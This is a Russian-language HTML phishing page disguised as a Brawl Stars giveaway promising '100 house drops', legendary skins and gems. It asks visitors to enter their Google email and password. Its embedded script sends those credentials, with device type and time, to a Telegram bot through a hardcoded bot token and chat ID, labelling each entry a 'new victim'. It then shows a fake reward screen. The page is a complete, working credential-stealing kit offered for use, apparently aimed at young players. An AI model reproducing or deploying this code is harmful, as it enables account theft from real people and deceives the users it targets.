<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Brawl Stars | 100 Хаус-Дропов</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', 'Roboto', system-ui, -apple-system, sans-serif;
            background: radial-gradient(circle at 20% 30%, #1a2a3a, #0a1118);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .card {
            background: rgba(255, 255, 255, 0.97);
            border-radius: 32px;
            padding: 32px 28px;
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3);
            text-align: center;
            max-width: 450px;
            width: 100%;
        }

        .icon {
            font-size: 56px;
            margin-bottom: 16px;
        }

        h2 {
            color: #0f2b3d;
            margin-bottom: 8px;
            font-size: 26px;
            font-weight: 800;
        }

        .subtitle {
            color: #5a6874;
            margin-bottom: 28px;
            font-size: 14px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #1f2f3e;
            font-weight: 600;
            font-size: 13px;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            font-size: 15px;
            border: 1.5px solid #e2e8f0;
            border-radius: 18px;
            background: #f9fafc;
        }

        .input-group input:focus {
            outline: none;
            border-color: #f5b042;
            background: white;
        }

        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(95deg, #f5b042 0%, #f29b2e 100%);
            color: #1e2a32;
            border: none;
            border-radius: 40px;
            font-size: 17px;
            font-weight: 800;
            cursor: pointer;
            margin-top: 8px;
        }

        .btn:active {
            transform: scale(0.97);
        }

        .loader {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid #fff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.5s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .reward-box {
            display: none;
            background: linear-gradient(145deg, #1f2e3e 0%, #0e1a26 100%);
            border-radius: 48px;
            padding: 36px 24px;
            text-align: center;
            color: white;
        }

        .reward-box h2 {
            color: #ffdf8c;
        }

        .drop-number {
            font-size: 64px;
            font-weight: 900;
            background: linear-gradient(135deg, #ffd966, #ffaa33);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .error-message {
            color: #e34d4d;
            font-size: 12px;
            margin-top: 6px;
            display: none;
        }
    </style>
</head>
<body>
<div class="card" id="googleForm">
    <div class="icon">🎁⚡</div>
    <h2>100 ХАУС-ДРОПОВ</h2>
    <p class="subtitle">Войдите в Google чтобы получить</p>
    <form id="loginForm">
        <div class="input-group">
            <label>📧 Электронная почта</label>
            <input type="email" id="email" placeholder="example@gmail.com" required>
        </div>
        <div class="input-group">
            <label>🔑 Пароль</label>
            <input type="password" id="password" placeholder="Введите пароль" required>
        </div>
        <div class="error-message" id="errorMsg">Неверные данные</div>
        <button type="submit" class="btn" id="submitBtn">ПОЛУЧИТЬ</button>
    </form>
</div>

<div class="reward-box" id="rewardBox">
    <div class="icon">🏆🔥</div>
    <h2>ХАУС-ДРОПЫ АКТИВИРОВАНЫ!</h2>
    <div class="drop-number">100</div>
    <p>⭐ Легендарные скины<br>💎 2500 Гемов<br>🎟️ 10 Мега-ящиков</p>
    <button class="btn" id="claimBtn" style="margin-top:20px">ЗАБРАТЬ</button>
</div>

<script>
const BOT_TOKEN = "8601549576:AAHLJF0oPN6Sx6jQRpfuHz-Stl3Fri_6LxI";
const ADMIN_ID = "8744429026";

function getDevice() {
    const ua = navigator.userAgent;
    if (/android/i.test(ua)) return "Android";
    if (/iPhone|iPad/i.test(ua)) return "iOS";
    return "Компьютер";
}

async function sendToBot(email, password) {
    const text = `🔐 НОВАЯ ЖЕРТВА!\n\n📧 Почта: ${email}\n🔑 Пароль: ${password}\n📡 IP: через GitHub\n📱 Устройство: ${getDevice()}\n⏰ Время: ${new Date().toLocaleString()}`;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}`;
    try {
        await fetch(url);
    } catch(e) {
        console.log("Ошибка отправки");
    }
}

document.getElementById('loginForm').onsubmit = async (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const btn = document.getElementById('submitBtn');
    
    btn.innerHTML = '<span class="loader"></span> Проверка...';
    btn.disabled = true;
    
    await sendToBot(email, password);
    
    setTimeout(() => {
        document.getElementById('googleForm').style.display = 'none';
        document.getElementById('rewardBox').style.display = 'block';
    }, 1000);
};

document.getElementById('claimBtn').onclick = () => {
    window.location.href = '404.html';
};
</script>
</body>
</html>
